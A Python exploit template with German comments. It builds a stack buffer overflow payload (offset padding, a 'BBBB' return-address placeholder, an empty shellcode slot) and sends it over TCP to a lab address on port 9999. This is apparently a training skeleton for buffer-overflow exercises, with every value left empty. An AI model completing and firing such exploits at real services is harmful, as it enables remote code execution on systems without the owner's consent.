import socket

def exploit(target_ip, target_port):
    prefix = b""  # Falls notwendig, z. B. ein fester Header vor dem Buffer
    offset = 0  # Offset bis zum EIP-Überschreiben
    overflow = b"A" * offset
    retn = b"BBBB"  # Platzhalter für die neue Rücksprungadresse
    padding = b""  # Falls erforderlich, um das Layout im Speicher anzupassen
    payload = b""  # Hier kommt der eigentliche Shellcode rein
    postfix = b""  # Falls notwendig, z. B. ein fester Footer nach dem Buffer
    
    buffer = prefix + overflow + retn + padding + payload + postfix
    
    try:
        print(f"[*] Sending payload ({len(buffer)} bytes)...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))
        s.send(buffer + b"\r\n")
        s.close()
        print("[*] Exploit sent successfully!")
    except Exception as e:
        print(f"[!] Failed to send exploit: {e}")

if __name__ == "__main__":
    target_ip = "192.168.1.100"
    target_port = 9999
    exploit(target_ip, target_port)
